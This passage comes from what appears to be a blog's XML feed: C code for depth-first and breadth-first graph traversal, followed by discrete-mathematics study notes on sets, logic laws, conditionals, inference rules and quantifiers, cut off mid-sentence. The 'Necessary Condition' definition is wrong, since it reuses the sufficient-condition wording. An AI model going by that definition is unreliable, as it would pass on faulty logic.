class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_N 10000</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> vertex;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125;Node, *LinkedList;<br><br><span class="hljs-function">LinkedList <span class="hljs-title">insert_node</span><span class="hljs-params">(LinkedList head, <span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    Node *node = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    node-&gt;vertex = index;<br>    node-&gt;next = head;<br>    head = node;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Graph</span> &#123;</span><br>    LinkedList edges[MAX_N];<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> visited[MAX_N];<br>&#125;Graph;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    g-&gt;n = n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        g-&gt;edges[i] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(g-&gt;visited, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(g-&gt;visited));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span> || x &gt;= g-&gt;n || y &lt; <span class="hljs-number">0</span> || y &gt;= g-&gt;n) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    g-&gt;edges[x] = insert_node(g-&gt;edges[x], y);<br>    g-&gt;edges[y] = insert_node(g-&gt;edges[y], x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Graph *g)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        Node *head = g-&gt;edges[i];<br>        <span class="hljs-keyword">while</span> (head != <span class="hljs-literal">NULL</span>) &#123;<br>            Node *delete_node = head;<br>            head = head-&gt;next;<br>            <span class="hljs-built_in">free</span>(delete_node);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(g);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> vertex)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, vertex);<br>    g-&gt;visited[vertex] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (Node *adj = g-&gt;edges[vertex]; adj != <span class="hljs-literal">NULL</span>; adj = adj-&gt;next) &#123;<br>        <span class="hljs-keyword">if</span> (!g-&gt;visited[adj-&gt;vertex]) &#123;<br>            dfs(g, adj-&gt;vertex);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, m, k;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;n, &amp;m);<br>    Graph *graph = (Graph *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Graph));<br>    init(graph, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; ++i) &#123;<br>        <span class="hljs-keyword">int</span> x, y;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;x, &amp;y);<br>        insert(graph, x, y);<br>    &#125;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;k);<br>    dfs(graph, k);<br>    <span class="hljs-built_in">clear</span>(graph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4><span id="广度优先">广度优先</span></h4><p>先遍历完一个节点的所有相邻节点，再遍历相邻节点的相邻节点。</p><p>使用 queue 实现广度优先搜索。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_N 10000</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Queue</span> &#123;</span><br>    <span class="hljs-keyword">int</span> *data;<br>    <span class="hljs-keyword">int</span> head, tail, length;<br>&#125; Queue;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init_queue</span><span class="hljs-params">(Queue *q, <span class="hljs-keyword">int</span> length_input)</span> </span>&#123;<br>    q-&gt;data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * length_input);<br>    q-&gt;length = length_input;<br>    q-&gt;head = <span class="hljs-number">0</span>;<br>    q-&gt;tail = <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(Queue *q, <span class="hljs-keyword">int</span> element)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (q-&gt;tail + <span class="hljs-number">1</span> &lt; q-&gt;length) &#123;<br>        q-&gt;tail++;<br>        q-&gt;data[q-&gt;tail] = element;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">front</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> q-&gt;data[q-&gt;head];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    q-&gt;head++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">empty</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (q-&gt;head &gt; q-&gt;tail) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear_queue</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(q-&gt;data);<br>    <span class="hljs-built_in">free</span>(q);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> vertex;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125;Node, *LinkedList;<br><br><span class="hljs-function">LinkedList <span class="hljs-title">insert_node</span><span class="hljs-params">(LinkedList head, <span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    Node *node = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    node-&gt;vertex = index;<br>    node-&gt;next = head;<br>    head = node;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Graph</span> &#123;</span><br>    LinkedList edges[MAX_N];<br>    <span class="hljs-keyword">int</span> visited[MAX_N];<br>    <span class="hljs-keyword">int</span> n;<br>&#125;Graph;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init_graph</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    g-&gt;n = n;<br>    <span class="hljs-built_in">memset</span>(g-&gt;visited, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(g-&gt;visited));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        g-&gt;edges[i] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span> || x &gt;= g-&gt;n || y &lt; <span class="hljs-number">0</span> || y &gt;= g-&gt;n) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    g-&gt;edges[x] = insert_node(g-&gt;edges[x], y);<br>    g-&gt;edges[y] = insert_node(g-&gt;edges[y], x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear_graph</span><span class="hljs-params">(Graph *g)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        Node *head = g-&gt;edges[i];<br>        <span class="hljs-keyword">while</span> (head != <span class="hljs-literal">NULL</span>) &#123;<br>            Node *delete_node = head;<br>            head = head-&gt;next;<br>            <span class="hljs-built_in">free</span>(delete_node);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(g);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bfs</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> start_vertex)</span> </span>&#123;<br>    Queue *<span class="hljs-built_in">queue</span> = (Queue *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Queue));<br>    init_queue(<span class="hljs-built_in">queue</span>, g-&gt;n);<br>    push(<span class="hljs-built_in">queue</span>, start_vertex);<br>    g-&gt;visited[start_vertex] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (!empty(<span class="hljs-built_in">queue</span>)) &#123;<br>        <span class="hljs-keyword">int</span> vertex = front(<span class="hljs-built_in">queue</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, vertex);<br>        pop(<span class="hljs-built_in">queue</span>);<br>        <span class="hljs-keyword">for</span> (Node *adj = g-&gt;edges[vertex]; adj != <span class="hljs-literal">NULL</span>; adj = adj-&gt;next) &#123;<br>            <span class="hljs-keyword">if</span> (!g-&gt;visited[adj-&gt;vertex]) &#123;<br>                g-&gt;visited[adj-&gt;vertex] = <span class="hljs-number">1</span>;<br>                push(<span class="hljs-built_in">queue</span>, adj-&gt;vertex);<br>            &#125;<br>        &#125;<br>    &#125;<br>    clear_queue(<span class="hljs-built_in">queue</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, m, k;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;n, &amp;m);<br>    Graph *graph = (Graph *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Graph));<br>    init_graph(graph, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; ++i) &#123;<br>        <span class="hljs-keyword">int</span> x, y;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;x, &amp;y);<br>        insert(graph, x, y);<br>    &#125;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;k);<br>    bfs(graph, k);<br>    clear_graph(graph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Data Structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> data structure </tag>
            
            <tag> cs basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离散数学</title>
      <link href="/posts/fbbb19a4.html"/>
      <url>/posts/fbbb19a4.html</url>
      
        <content type="html"><![CDATA[<h2><span id="representation">Representation</span></h2><h3><span id="set-no-order">Set: no order</span></h3><ol type="1"><li>set roster notation: <span class="math inline">\(\{1, 2,3\}\)</span></li><li>set builder notation: <span class="math inline">\(\{x|P(x)\}\)</span>, P means Property</li></ol><p>Empty set:</p><ol type="1"><li><span class="math inline">\(\phi \subset \{1,2,3\}\)</span> is<code>vacuously true</code>. （空真）</li></ol><hr><h3><span id="ordered-pairs">Ordered Pairs</span></h3><p>(a, b, c): order matters</p><blockquote><p>a, b, c : can be different type of elements</p></blockquote><h4><span id="cartesian-product-笛卡尔积">Cartesian Product: 笛卡尔积</span></h4><p><span class="math inline">\(A × B\)</span> ： is all ordered pairs(a, b) where a <span class="math inline">\(\in\)</span> A, b <span class="math inline">\(\in\)</span> B.</p><blockquote><ul><li><span class="math inline">\(\{a,b\} × \{0,1\}\)</span> = { (a, 0),(a, 1), (b, 0), (b, 1) }</li><li>A point in a two-dimensional coordinate system can be represented by<span class="math inline">\(R \times R\)</span>.二维坐标系中的点可表示为 <span class="math inline">\(R \timesR\)</span></li></ul></blockquote><hr><h3><span id="relations">Relations</span></h3><ul><li><p>Def:</p><p>​ A relation R between A and B is a subset of <span class="math inline">\(A \times B\)</span>.</p></li></ul><hr><h3><span id="function">Function</span></h3><ul><li><p>Def:</p><p>​ A function F between A and B is a relation between A and B suchthat:</p><ul><li>for every <span class="math inline">\(x \in A\)</span> there is a<span class="math inline">\(y \in B\)</span> such that <span class="math inline">\((x,y) \in F\)</span></li><li>if <span class="math inline">\((x,y)\in F \ and \ (x,z) \inF\)</span> then <span class="math inline">\(y=z\)</span></li></ul></li></ul><blockquote><p>Ex: <span class="math inline">\(x^2 + y^2 = 1\)</span> is not afunction in Discrete Math domain definition.</p></blockquote><hr><h3><span id="statement">Statement</span></h3><ul><li><p>Def:</p><p>​ A sentence that is either <code>True</code> or<code>False</code>.</p></li><li><p>Combine Form:</p><ol type="1"><li><span class="math inline">\(\lnot p\)</span></li><li><span class="math inline">\(p \land q\)</span></li><li><span class="math inline">\(p\lor q\)</span></li></ol></li></ul><blockquote><p>Ex 1:</p><p>​ "My shirt is gray but my shorts are not."</p><p>​ p: "my shirt is gray", q: "my shorts are gray"</p><p>​ ~q: "my shorts are not gray"</p><p>​ the result logic form: <span class="math inline">\(p \land \lnotq\)</span></p></blockquote><h4><span id="truth-table">Truth table</span></h4><table><thead><tr class="header"><th>p</th><th>q</th><th><span class="math inline">\(\lnot p\)</span></th><th><span class="math inline">\(p \land q\)</span></th><th><span class="math inline">\(p\lor q\)</span></th></tr></thead><tbody><tr class="odd"><td>T</td><td>T</td><td>F</td><td>T</td><td>T</td></tr><tr class="even"><td>T</td><td>F</td><td>F</td><td>F</td><td>T</td></tr><tr class="odd"><td>F</td><td>T</td><td>T</td><td>F</td><td>T</td></tr><tr class="even"><td>F</td><td>F</td><td>T</td><td>F</td><td>F</td></tr></tbody></table><h4><span id="logically-equivalent">Logically equivalent</span></h4><ul><li><p>Def:</p><p>​ Two statements have the same truth table.</p></li></ul><blockquote><p>Ex: <span class="math inline">\(p \equiv \lnot(\lnot p)\)</span></p></blockquote><h4><span id="tautology">Tautology</span></h4><ul><li><p>Def:</p><p>​ A tautology is a statement that is always<code>True</code>.</p></li></ul><h4><span id="contradiction">Contradiction</span></h4><ul><li><p>Def:</p><p>​ A contradiction is a statement that is always<code>False</code>.</p></li></ul><h4><span id="basic-laws">Basic Laws</span></h4><p>Obvious but useful</p><ol type="1"><li><p>DeMorgan`s Law:</p><p><span class="math inline">\(\lnot(p \land q) \equiv (\lnot p) \lor(\lnot) q\)</span></p><p><span class="math inline">\(\lnot(p \lor q) \equiv (\lnot p) \land(\lnot) q\)</span></p></li><li><p>Identity Laws:</p><p><span class="math inline">\(p \lor contradiction \equivp\)</span></p><p><span class="math inline">\(p \land tautology \equivp\)</span></p></li><li><p>Universal Bound Laws:</p><p><span class="math inline">\(p \land contradiction \equivcontradiction\)</span></p><p><span class="math inline">\(p \lor tautology \equivtautology\)</span></p></li></ol><blockquote><p>Ex: <span class="math display">\[\begin{align*}(\lnot(p \lor \lnot q)) \land tautology(t) &amp; \\(DeMorgan`s\ Law) &amp; \equiv (\lnot p \land \lnot(\lnot q)) \land t \\(Double\ Negative) &amp; \equiv (\lnot p \land q) \land t \\(Identity) &amp; \equiv \lnot p \land q\end{align*}\]</span></p></blockquote><hr><h3><span id="conditional-statements">Conditional statements</span></h3><ul><li><p>Def:</p><p>​ <span class="math inline">\(p \to q\)</span> means "if p is Truethen q is True"</p><table><thead><tr class="header"><th>p</th><th>q</th><th><span class="math inline">\(p \to q\)</span></th><th><span class="math inline">\(\lnot p \lor q\)</span></th></tr></thead><tbody><tr class="odd"><td>T</td><td>T</td><td>T</td><td>T</td></tr><tr class="even"><td>T</td><td>F</td><td>F</td><td>F</td></tr><tr class="odd"><td>F</td><td>T</td><td>T(vacuously true)</td><td>T</td></tr><tr class="even"><td>F</td><td>F</td><td>T(vacuously true)</td><td>T</td></tr></tbody></table><p>If p is false, then I didn`t have a assumption indeed. Think it as avacuously true statement.</p><blockquote></blockquote></li></ul><h4><span id="vacuously-true-statement">Vacuously true statement</span></h4><ul><li><p>When the hypothesis (<span class="math inline">\(p\)</span>) isfalse.</p><blockquote><p>Ex: if I am a pig, then the world will be better.</p><p>​ equal form: <code>Either</code> I am <code>not</code> a pig,<code>or</code> the world will be better.</p><p>​ "I am <code>not</code> a pig.". It is vacuously true, anyway. So thewhole statement is <code>True</code>.</p></blockquote></li></ul><h4><span id="negating-a-conditional">Negating a conditional</span></h4><ul><li><span class="math inline">\(\lnot (p \to q) \equiv \lnot (\lnot p\lor q)\)</span></li></ul><p><span class="math display">\[\begin{align*}\lnot (\lnot p \lor q) &amp; \equiv (\lnot \lnot p \land \lnot q) \\&amp; \equiv p \land \lnot q\end{align*}\]</span></p><h4><span id="contrapositive-of-astatement">Contrapositive of astatement</span></h4><ul><li><p>Def:</p><p>​ <span class="math inline">\(p \to q \equiv \lnot q \to \lnotp\)</span></p><p>equal form: <span class="math inline">\(\lnot p \lor q \equiv q \lor\lnot p\)</span></p></li></ul><h4><span id="converse-of-a-statement">Converse of a statement</span></h4><ul><li><p>Def:</p><p>​ Converse of <span class="math inline">\(p \to q\)</span> is <span class="math inline">\(q \to p\)</span>. Not necessarily logicallyequivalent.</p></li></ul><h4><span id="inverse-of-a-statement">Inverse of a statement</span></h4><ul><li><p>Def:</p><p>​ Inverse of <span class="math inline">\(p \to q\)</span> is <span class="math inline">\(\lnot p \to \lnot q\)</span>.</p><p>Cause the <code>contrapositive</code> is <span class="math inline">\(\lnot q \to \lnot p\)</span> which is the<code>converse</code> of <span class="math inline">\(\lnot p \to \lnotq\)</span>, so:</p><blockquote><p>the <code>inverse</code> of <span class="math inline">\(p \toq\)</span> is the <code>converse</code> of the<code>contrapositive</code> of <span class="math inline">\(p \toq\)</span>.</p></blockquote></li></ul><hr><h3><span id="biconditional">Biconditional</span></h3><ul><li><p>Def:</p><p>​ <span class="math inline">\(p \leftrightarrow q\)</span> means <span class="math inline">\(p \to q\)</span> and <span class="math inline">\(q\to p\)</span>.</p><blockquote><p>Ex: I will pass the exam <code>if and only if</code> I studyhard.</p><p>​ It means biconditional.</p></blockquote></li></ul><hr><h2><span id="logic-arguments">Logic Arguments</span></h2><ul><li><p>Def:</p><p>​ A <code>valid argument</code> is a list of premises from which theconclusion follows.</p><blockquote><p>premises: statements.</p></blockquote></li></ul><h3><span id="modus-ponens-肯定前件推理">Modus Ponens: 肯定前件推理</span></h3><blockquote><p>if <span class="math inline">\(p\)</span>, then <span class="math inline">\(q\)</span></p><p><span class="math inline">\(p\)</span></p><p>therefore <span class="math inline">\(q\)</span></p></blockquote><table><thead><tr class="header"><th>p</th><th>q</th><th><span class="math inline">\(p \to q\)</span>(premises)</th><th>p(premises)</th><th>conclusion</th></tr></thead><tbody><tr class="odd"><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td></tr><tr class="even"><td>T</td><td>F</td><td>F</td><td><span class="math inline">\(\boxtimes\)</span></td><td><span class="math inline">\(\boxtimes\)</span></td></tr><tr class="odd"><td>F</td><td>T</td><td>T</td><td><span class="math inline">\(\boxtimes\)</span></td><td><span class="math inline">\(\boxtimes\)</span></td></tr><tr class="even"><td>F</td><td>F</td><td>T</td><td><span class="math inline">\(\boxtimes\)</span></td><td><span class="math inline">\(\boxtimes\)</span></td></tr></tbody></table><p>We focus on where premises is true.</p><h3><span id="modus-tollens-否定后件推理">Modus Tollens: 否定后件推理</span></h3><blockquote><p>if <span class="math inline">\(p\)</span>, then <span class="math inline">\(q\)</span></p><p><span class="math inline">\(\lnot q\)</span></p><p>therefore <span class="math inline">\(\lnot p\)</span></p></blockquote><p>We focus on where premises is true.</p><h3><span id="generalization">Generalization</span></h3><blockquote><p><span class="math inline">\(p\)</span> (True)</p><p>therefore, <span class="math inline">\(p \lor q\)</span></p></blockquote><h3><span id="specialization">Specialization</span></h3><blockquote><p><span class="math inline">\(p \land q\)</span> (True)</p><p>therefore, <span class="math inline">\(p\)</span></p></blockquote><h3><span id="contradiction">Contradiction</span></h3><blockquote><p><span class="math inline">\(\lnot p \to contradiction\)</span></p><p>therefore, <span class="math inline">\(p\)</span></p></blockquote><h2><span id="predicate">Predicate</span></h2><ul><li><p>Def:</p><p>​ A predicate(谓词) is a statement depending on variables whichbecomes a statement upon substituting values in the domain.</p><blockquote><p>Ex:</p><p>​ P(x): x is the variable that is a factor of 12 with domain <span class="math inline">\(Z^+\)</span>.</p><blockquote><p>P(x) is a predicate. When x = 6, P(6) is True. When x = 7, P(7) isFalse.</p></blockquote></blockquote></li></ul><h3><span id="true-set">True set</span></h3><ul><li><p>Def:</p><p>​ It is a predicate P(x) satisfies that <span class="math inline">\(\{x \in D | P(x)\ is\ True\}\)</span></p></li></ul><h3><span id="universal-quantifier">Universal Quantifier</span></h3><ul><li><p><span class="math inline">\(\forall\)</span> means "for all".</p><p><span class="math inline">\(\forall x \in D, P(x)\)</span> means: Forall x in domain D, <span class="math inline">\(P(x)\)</span> isTrue.</p><blockquote><p>Ex:</p><p>​ Every dog is mammal.</p><blockquote><p>D is the <code>dog</code> domain, P(x) means x is a mammal.</p></blockquote></blockquote></li></ul><h3><span id="existential-quantifier">Existential Quantifier</span></h3><ul><li><p><span class="math inline">\(\exists\)</span> mean "thereexists"</p><p><span class="math inline">\(\exists x \in D, P(x)\)</span> means:There exists x in the domain, such that P(x) is True.</p><blockquote><p>Ex:</p><p>​ Some person is the oldest in the world.</p><blockquote><p>D is people in the world. P(x) means that x is the oldest.</p></blockquote></blockquote></li></ul><h3><span id="summary">Summary</span></h3><ol type="1"><li>P: "The earth is round." -&gt; <code>Statement</code></li><li>P(x): "x is round." -&gt; <code>Predicate</code></li><li>Q: <span class="math inline">\(\forall x \in D, P(x)\)</span>:"Every dog is a mammal." -&gt; <code>Statement</code></li><li>Q: <span class="math inline">\(\exists x \in D, P(x)\)</span>: "Someperson is the oldest in the world." -&gt; <code>Statement</code></li></ol><h3><span id="negate-quantifier">Negate Quantifier</span></h3><p>For example, we have "<span class="math inline">\(\forall x \in Z^+,x &gt; 4\)</span>".</p><p>Negate the quantifier: <span class="math display">\[\lnot(\forall x \in D, P(x)) \equiv (\exists x \in D, \lnot P(x))\]</span> So, for the example, we have "<span class="math inline">\(\exists x \in Z^+, x \leqslant 4\)</span>".</p><blockquote><p>Ex:</p><p>​ Every integer has a larger integer.</p><blockquote><p>It is <span class="math inline">\(\forall x \in Z, P(x): (\exists y\in Z, P(y): (y &gt; x))\)</span>.</p><p>Negate it, we have <span class="math inline">\(\exists x \in Z,(\forall y \in Z, y \leqslant x)\)</span>, which can`t be True.</p></blockquote></blockquote><blockquote><p>Ex:</p><p>​ Some number in D is the largest.</p><blockquote><p>It is <span class="math inline">\(\exists x \in D, (\forall y \in D,x \geqslant y)\)</span>.</p><p>Negate it, we have <span class="math inline">\(\forall x \in D,(\exists y \in D, x &lt; y)\)</span></p></blockquote></blockquote><h3><span id="conditional-predicate">Conditional Predicate</span></h3><h4><span id="universal-conditionals">Universal-Conditionals</span></h4><ul><li><p>Def:</p><p>​ <span class="math inline">\(P(x) \Rightarrow Q(x)\)</span> means<span class="math inline">\(\forall x \in D, P(x) \to Q(x)\ is\True\)</span>.</p></li></ul><blockquote><p>Ex:</p><p>​ If x is a dog, then x is a mammal.</p><blockquote><p>D maybe all possible animals.</p></blockquote></blockquote><h4><span id="sufficient-condition">Sufficient Condition</span></h4><ul><li><p>Def:</p><p>​ If <span class="math inline">\(A(x)\)</span> , then <span class="math inline">\(B(x)\)</span>. We have <span class="math inline">\(A(x)\)</span> is a sufficient condition for <span class="math inline">\(B(x)\)</span>.</p></li></ul><h4><span id="necessary-condition">Necessary Condition</span></h4><ul><li><p>Def:</p><p>​ If $ A(x)$ , then $ B(x)$. We have <span class="math inline">\(A(x)\)</span> is a necessary condition for <span class="math inline">\(B(x)\)</span>.</p></li></ul><p>Use contrapositive statement to explain above definition.</p><h2><span id="proof">Proof</span></h2><ul><li><p>Precisely define even &amp; odd integers</p><blockquote><p>n is 